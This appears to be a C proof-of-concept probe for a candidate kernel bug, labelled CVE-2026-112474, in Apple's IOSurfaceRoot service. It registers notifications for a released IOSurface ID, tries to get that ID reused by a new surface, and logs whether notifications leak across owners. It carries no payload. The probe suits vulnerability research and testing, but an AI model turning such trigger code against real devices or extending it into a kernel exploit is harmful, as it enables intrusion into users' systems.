#include "CVE112474Probe.h"

#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <limits.h>
#include <mach/mach.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef uint32_t io_object_t;
typedef io_object_t io_iterator_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;

typedef CFMutableDictionaryRef (*io_service_matching_fn)(const char *name);
typedef kern_return_t (*io_service_get_matching_services_fn)(
    mach_port_t main_port,
    CFDictionaryRef matching,
    io_iterator_t *existing);
typedef io_object_t (*io_iterator_next_fn)(io_iterator_t iterator);
typedef kern_return_t (*io_object_release_fn)(io_object_t object);
typedef kern_return_t (*io_service_open_fn)(
    io_service_t service,
    task_port_t owning_task,
    uint32_t type,
    io_connect_t *connect);
typedef kern_return_t (*io_service_close_fn)(io_connect_t connect);
typedef kern_return_t (*io_connect_call_async_method_fn)(
    io_connect_t connection,
    uint32_t selector,
    mach_port_t wake_port,
    uint64_t *reference,
    uint32_t reference_count,
    const uint64_t *scalar_input,
    uint32_t scalar_input_count,
    const void *structure_input,
    size_t structure_input_size,
    uint64_t *scalar_output,
    uint32_t *scalar_output_count,
    void *structure_output,
    size_t *structure_output_size);
typedef kern_return_t (*io_connect_call_method_fn)(
    io_connect_t connection,
    uint32_t selector,
    const uint64_t *scalar_input,
    uint32_t scalar_input_count,
    const void *structure_input,
    size_t structure_input_size,
    uint64_t *scalar_output,
    uint32_t *scalar_output_count,
    void *structure_output,
    size_t *structure_output_size);

typedef int32_t (*cv_pixel_buffer_create_fn)(
    CFAllocatorRef allocator,
    size_t width,
    size_t height,
    uint32_t pixel_format,
    CFDictionaryRef attributes,
    CFTypeRef *pixel_buffer_out);
typedef void *(*cv_pixel_buffer_get_iosurface_fn)(CFTypeRef pixel_buffer);
typedef uint32_t (*iosurface_get_id_fn)(void *surface);
typedef void (*iosurface_use_count_fn)(void *surface);
typedef mach_msg_return_t (*mach_msg_fn)(
    mach_msg_header_t *message,
    mach_msg_option_t option,
    mach_msg_size_t send_size,
    mach_msg_size_t receive_limit,
    mach_port_name_t receive_name,
    mach_msg_timeout_t timeout,
    mach_port_name_t notify);

struct probe_symbols {
    void *iokit;
    void *core_video;
    void *io_surface;
    io_service_matching_fn service_matching;
    io_service_get_matching_services_fn get_matching_services;
    io_iterator_next_fn iterator_next;
    io_object_release_fn object_release;
    io_service_open_fn service_open;
    io_service_close_fn service_close;
    io_connect_call_async_method_fn call_async;
    io_connect_call_method_fn call_method;
    cv_pixel_buffer_create_fn pixel_buffer_create;
    cv_pixel_buffer_get_iosurface_fn pixel_buffer_get_iosurface;
    iosurface_get_id_fn surface_get_id;
    iosurface_use_count_fn increment_use_count;
    iosurface_use_count_fn decrement_use_count;
    mach_msg_fn receive_message;
    const CFStringRef *surface_properties_key;
};

volatile uint32_t cve_2026_112474_surface_id = 0;
volatile int32_t cve_2026_112474_register_result = INT32_MIN;
volatile int32_t cve_2026_112474_remove_result = INT32_MIN;
volatile uint32_t cve_2026_112474_reborn_surface_id = 0;
volatile int32_t cve_2026_112474_receive_after_increment = INT32_MIN;
volatile int32_t cve_2026_112474_receive_after_decrement = INT32_MIN;
volatile uint32_t cve_2026_112474_live_registered_bits = 0;
volatile uint32_t cve_2026_112474_live_initial_delivery_bits = 0;
volatile uint32_t cve_2026_112474_live_increment_delivery_bits = 0;
volatile uint32_t cve_2026_112474_live_decrement_delivery_bits = 0;

static void close_symbols(struct probe_symbols *symbols)
{
    if (symbols->io_surface != NULL) {
        dlclose(symbols->io_surface);
    }
    if (symbols->core_video != NULL) {
        dlclose(symbols->core_video);
    }
    if (symbols->iokit != NULL) {
        dlclose(symbols->iokit);
    }
}

static int load_symbols(struct probe_symbols *symbols)
{
    memset(symbols, 0, sizeof(*symbols));

    symbols->iokit = dlopen(
        "/System/Library/Frameworks/IOKit.framework/IOKit",
        RTLD_LAZY | RTLD_LOCAL);
    symbols->core_video = dlopen(
        "/System/Library/Frameworks/CoreVideo.framework/CoreVideo",
        RTLD_LAZY | RTLD_LOCAL);
    symbols->io_surface = dlopen(
        "/System/Library/Frameworks/IOSurface.framework/IOSurface",
        RTLD_LAZY | RTLD_LOCAL);
    if (symbols->iokit == NULL || symbols->core_video == NULL ||
        symbols->io_surface == NULL) {
        return -1;
    }

#define LOAD(handle, field, name)                                      \
    do {                                                               \
        *(void **)(&symbols->field) = dlsym((handle), (name));         \
        if (symbols->field == NULL) {                                  \
            return -1;                                                 \
        }                                                              \
    } while (0)

    LOAD(symbols->iokit, service_matching, "IOServiceMatching");
    LOAD(symbols->iokit, get_matching_services,
         "IOServiceGetMatchingServices");
    LOAD(symbols->iokit, iterator_next, "IOIteratorNext");
    LOAD(symbols->iokit, object_release, "IOObjectRelease");
    LOAD(symbols->iokit, service_open, "IOServiceOpen");
    LOAD(symbols->iokit, service_close, "IOServiceClose");
    LOAD(symbols->iokit, call_async, "IOConnectCallAsyncMethod");
    LOAD(symbols->iokit, call_method, "IOConnectCallMethod");
    LOAD(symbols->core_video, pixel_buffer_create, "CVPixelBufferCreate");
    LOAD(symbols->core_video, pixel_buffer_get_iosurface,
         "CVPixelBufferGetIOSurface");
    LOAD(symbols->io_surface, surface_get_id, "IOSurfaceGetID");

    *(void **)(&symbols->increment_use_count) = dlsym(
        symbols->io_surface, "IOSurfaceIncrementUseCount");
    *(void **)(&symbols->decrement_use_count) = dlsym(
        symbols->io_surface, "IOSurfaceDecrementUseCount");
    *(void **)(&symbols->receive_message) = dlsym(
        RTLD_DEFAULT, "mach_msg");
    if (symbols->receive_message == NULL) {
        return -1;
    }

    symbols->surface_properties_key = dlsym(
        symbols->core_video,
        "kCVPixelBufferIOSurfacePropertiesKey");
    if (symbols->surface_properties_key == NULL ||
        *symbols->surface_properties_key == NULL) {
        return -1;
    }
#undef LOAD

    return 0;
}

static CFTypeRef make_surface(
    struct probe_symbols *symbols,
    uint32_t *surface_id_out,
    void **surface_out)
{
    *surface_id_out = 0;
    *surface_out = NULL;
    const void *attribute_keys[] = {*symbols->surface_properties_key};
    CFDictionaryRef empty = CFDictionaryCreate(
        kCFAllocatorDefault,
        NULL,
        NULL,
        0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    if (empty == NULL) {
        return NULL;
    }

    const void *attribute_values[] = {empty};
    CFDictionaryRef attributes = CFDictionaryCreate(
        kCFAllocatorDefault,
        attribute_keys,
        attribute_values,
        1,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    CFRelease(empty);
    if (attributes == NULL) {
        return NULL;
    }

    CFTypeRef pixel_buffer = NULL;
    const uint32_t bgra = 0x42475241U; /* 'BGRA' */
    int32_t cv_result = symbols->pixel_buffer_create(
        kCFAllocatorDefault,
        64,
        64,
        bgra,
        attributes,
        &pixel_buffer);
    CFRelease(attributes);
    if (cv_result != 0 || pixel_buffer == NULL) {
        printf("[CVE-2026-112474 candidate] CVPixelBufferCreate=%d\n",
               cv_result);
        return NULL;
    }

    void *surface = symbols->pixel_buffer_get_iosurface(pixel_buffer);
    *surface_id_out = surface == NULL ? 0 :
        symbols->surface_get_id(surface);
    *surface_out = surface;
    return pixel_buffer;
}

static uint32_t make_then_release_surface_id(struct probe_symbols *symbols)
{
    uint32_t surface_id = 0;
    void *surface = NULL;
    CFTypeRef pixel_buffer = make_surface(symbols, &surface_id, &surface);
    (void)surface;
    if (pixel_buffer == NULL) {
        return 0;
    }

    /* The registration below deliberately happens after this final owner dies. */
    CFRelease(pixel_buffer);
    return surface_id;
}

static mach_msg_return_t receive_notification(
    struct probe_symbols *symbols,
    mach_port_t wake_port,
    mach_msg_timeout_t timeout)
{
    uint8_t buffer[4096] = {0};
    return symbols->receive_message(
        (mach_msg_header_t *)buffer,
        MACH_RCV_MSG | MACH_RCV_TIMEOUT,
        0,
        (mach_msg_size_t)sizeof(buffer),
        wake_port,
        timeout,
        MACH_PORT_NULL);
}

static void exercise_reused_id(
    struct probe_symbols *symbols,
    mach_port_t wake_port,
    uint32_t stale_id)
{
    CFTypeRef reborn_buffer = NULL;
    void *reborn_surface = NULL;

    for (uint32_t attempt = 0; attempt < 128; ++attempt) {
        uint32_t candidate_id = 0;
        void *candidate_surface = NULL;
        CFTypeRef candidate = make_surface(
            symbols, &candidate_id, &candidate_surface);
        if (candidate == NULL) {
            break;
        }
        cve_2026_112474_reborn_surface_id = candidate_id;
        if (candidate_id == stale_id) {
            reborn_buffer = candidate;
            reborn_surface = candidate_surface;
            break;
        }
        CFRelease(candidate);
    }

    if (reborn_buffer == NULL || reborn_surface == NULL ||
        symbols->increment_use_count == NULL ||
        symbols->decrement_use_count == NULL) {
        if (reborn_buffer != NULL) {
            CFRelease(reborn_buffer);
        }
        return;
    }

    symbols->increment_use_count(reborn_surface);
    cve_2026_112474_receive_after_increment =
        receive_notification(symbols, wake_port, 250);
    symbols->decrement_use_count(reborn_surface);
    cve_2026_112474_receive_after_decrement =
        receive_notification(symbols, wake_port, 250);
    CFRelease(reborn_buffer);
}

static kern_return_t register_surface_id(
    struct probe_symbols *symbols,
    io_connect_t connection,
    mach_port_t wake_port,
    uint32_t surface_id,
    uint8_t mask)
{
    uint8_t input[0x18] = {0};
    memcpy(input, &surface_id, sizeof(surface_id));
    input[4] = mask;

    uint64_t reference[2] = {1, 0};
    uint32_t scalar_output_count = 0;
    size_t structure_output_size = 0;
    return symbols->call_async(
        connection,
        0x11,
        wake_port,
        reference,
        1,
        NULL,
        0,
        input,
        sizeof(input),
        NULL,
        &scalar_output_count,
        NULL,
        &structure_output_size);
}

static kern_return_t remove_registration(
    struct probe_symbols *symbols,
    io_connect_t connection,
    uint32_t surface_id);

static io_connect_t open_surface_connection(
    struct probe_symbols *symbols,
    uint32_t *opened_type_out)
{
    *opened_type_out = UINT32_MAX;
    CFMutableDictionaryRef matching =
        symbols->service_matching("IOSurfaceRoot");
    io_iterator_t iterator = 0;
    kern_return_t kr = matching == NULL ? KERN_FAILURE :
        symbols->get_matching_services(0, matching, &iterator);
    if (kr != KERN_SUCCESS) {
        return 0;
    }

    io_service_t service = symbols->iterator_next(iterator);
    symbols->object_release(iterator);
    if (service == 0) {
        return 0;
    }

    io_connect_t connection = 0;
    for (uint32_t type = 0; type <= 2; ++type) {
        if (symbols->service_open(
                service, mach_task_self(), type, &connection) ==
            KERN_SUCCESS) {
            *opened_type_out = type;
            break;
        }
    }
    symbols->object_release(service);
    return connection;
}

static void exercise_live_mask_controls(struct probe_symbols *symbols)
{
    static const uint8_t masks[] = {1, 2, 4, 8, 0x0f, 0xff};

    for (uint32_t index = 0;
         index < (uint32_t)(sizeof(masks) / sizeof(masks[0]));
         ++index) {
        uint32_t opened_type = UINT32_MAX;
        io_connect_t connection = open_surface_connection(
            symbols, &opened_type);
        if (connection == 0) {
            printf("[CVE-2026-112474 live] mask=0x%x open failed\n",
                   masks[index]);
            continue;
        }

        mach_port_t wake_port = MACH_PORT_NULL;
        if (mach_port_allocate(
                mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake_port) !=
            KERN_SUCCESS) {
            symbols->service_close(connection);
            continue;
        }

        uint32_t surface_id = 0;
        void *surface = NULL;
        CFTypeRef pixel_buffer = make_surface(
            symbols, &surface_id, &surface);
        if (pixel_buffer == NULL || surface == NULL) {
            mach_port_deallocate(mach_task_self(), wake_port);
            symbols->service_close(connection);
            continue;
        }

        kern_return_t register_kr = register_surface_id(
            symbols,
            connection,
            wake_port,
            surface_id,
            masks[index]);
        uint32_t bit = 1U << index;
        if (register_kr == KERN_SUCCESS) {
            cve_2026_112474_live_registered_bits |= bit;
        }

        mach_msg_return_t initial = receive_notification(
            symbols, wake_port, 50);
        if (initial == MACH_MSG_SUCCESS) {
            cve_2026_112474_live_initial_delivery_bits |= bit;
        }

        mach_msg_return_t increment = INT32_MIN;
        mach_msg_return_t decrement = INT32_MIN;
        if (symbols->increment_use_count != NULL &&
            symbols->decrement_use_count != NULL) {
            symbols->increment_use_count(surface);
            increment = receive_notification(symbols, wake_port, 250);
            if (increment == MACH_MSG_SUCCESS) {
                cve_2026_112474_live_increment_delivery_bits |= bit;
            }
            symbols->decrement_use_count(surface);
            decrement = receive_notification(symbols, wake_port, 250);
            if (decrement == MACH_MSG_SUCCESS) {
                cve_2026_112474_live_decrement_delivery_bits |= bit;
            }
        }

        kern_return_t remove_kr = remove_registration(
            symbols, connection, surface_id);
        printf("[CVE-2026-112474 live] idx=%u mask=0x%x client=%u "
               "id=%u register=0x%x initial=0x%x increment=0x%x "
               "decrement=0x%x remove=0x%x\n",
               index,
               masks[index],
               opened_type,
               surface_id,
               register_kr,
               initial,
               increment,
               decrement,
               remove_kr);

        CFRelease(pixel_buffer);
        mach_port_deallocate(mach_task_self(), wake_port);
        symbols->service_close(connection);
    }
}

static kern_return_t remove_registration(
    struct probe_symbols *symbols,
    io_connect_t connection,
    uint32_t surface_id)
{
    uint8_t input[0x18] = {0};
    memcpy(input, &surface_id, sizeof(surface_id));
    input[4] = 1;
    size_t structure_output_size = 0;
    return symbols->call_method(
        connection,
        0x12,
        NULL,
        0,
        input,
        sizeof(input),
        NULL,
        NULL,
        NULL,
        &structure_output_size);
}

void cve_2026_112474_probe_run(void)
{
    cve_2026_112474_surface_id = 0;
    cve_2026_112474_register_result = INT32_MIN;
    cve_2026_112474_remove_result = INT32_MIN;
    cve_2026_112474_reborn_surface_id = 0;
    cve_2026_112474_receive_after_increment = INT32_MIN;
    cve_2026_112474_receive_after_decrement = INT32_MIN;
    cve_2026_112474_live_registered_bits = 0;
    cve_2026_112474_live_initial_delivery_bits = 0;
    cve_2026_112474_live_increment_delivery_bits = 0;
    cve_2026_112474_live_decrement_delivery_bits = 0;

    struct probe_symbols symbols;
    if (load_symbols(&symbols) != 0) {
        const char *error = dlerror();
        printf("[CVE-2026-112474 candidate] private symbols unavailable: %s\n",
               error == NULL ? "unknown error" : error);
        close_symbols(&symbols);
        return;
    }

    CFMutableDictionaryRef matching =
        symbols.service_matching("IOSurfaceRoot");
    io_iterator_t iterator = 0;
    kern_return_t kr = matching == NULL ? KERN_FAILURE :
        symbols.get_matching_services(0, matching, &iterator);
    if (kr != KERN_SUCCESS) {
        printf("[CVE-2026-112474 candidate] IOSurfaceRoot lookup=0x%x\n",
               kr);
        close_symbols(&symbols);
        return;
    }

    io_service_t service = symbols.iterator_next(iterator);
    symbols.object_release(iterator);
    if (service == 0) {
        puts("[CVE-2026-112474 candidate] IOSurfaceRoot not present");
        close_symbols(&symbols);
        return;
    }

    io_connect_t connection = 0;
    uint32_t opened_type = UINT32_MAX;
    for (uint32_t type = 0; type <= 2; ++type) {
        kr = symbols.service_open(
            service,
            mach_task_self(),
            type,
            &connection);
        if (kr == KERN_SUCCESS) {
            opened_type = type;
            break;
        }
    }
    symbols.object_release(service);
    if (connection == 0) {
        printf("[CVE-2026-112474 candidate] IOSurfaceRoot open=0x%x\n",
               kr);
        close_symbols(&symbols);
        return;
    }

    mach_port_t wake_port = MACH_PORT_NULL;
    kr = mach_port_allocate(
        mach_task_self(),
        MACH_PORT_RIGHT_RECEIVE,
        &wake_port);
    if (kr != KERN_SUCCESS) {
        printf("[CVE-2026-112474 candidate] mach_port_allocate=0x%x\n",
               kr);
        symbols.service_close(connection);
        close_symbols(&symbols);
        return;
    }

    uint32_t surface_id = make_then_release_surface_id(&symbols);
    cve_2026_112474_surface_id = surface_id;
    if (surface_id == 0) {
        puts("[CVE-2026-112474 candidate] no IOSurface-backed pixel buffer");
    } else {
        kern_return_t register_kr = register_surface_id(
            &symbols,
            connection,
            wake_port,
            surface_id,
            1);
        cve_2026_112474_register_result = register_kr;
        if (register_kr == KERN_SUCCESS) {
            exercise_reused_id(&symbols, wake_port, surface_id);
        }
        kern_return_t remove_kr = remove_registration(
            &symbols,
            connection,
            surface_id);
        cve_2026_112474_remove_result = remove_kr;
        printf("[CVE-2026-112474 candidate] client=%u released-id=%u "
               "register=0x%x reborn-id=%u inc-recv=0x%x "
               "dec-recv=0x%x remove=0x%x\n",
               opened_type,
               surface_id,
               register_kr,
               cve_2026_112474_reborn_surface_id,
               cve_2026_112474_receive_after_increment,
               cve_2026_112474_receive_after_decrement,
               remove_kr);
    }

    exercise_live_mask_controls(&symbols);

    mach_port_deallocate(mach_task_self(), wake_port);
    symbols.service_close(connection);
    close_symbols(&symbols);
    fflush(stdout);
}
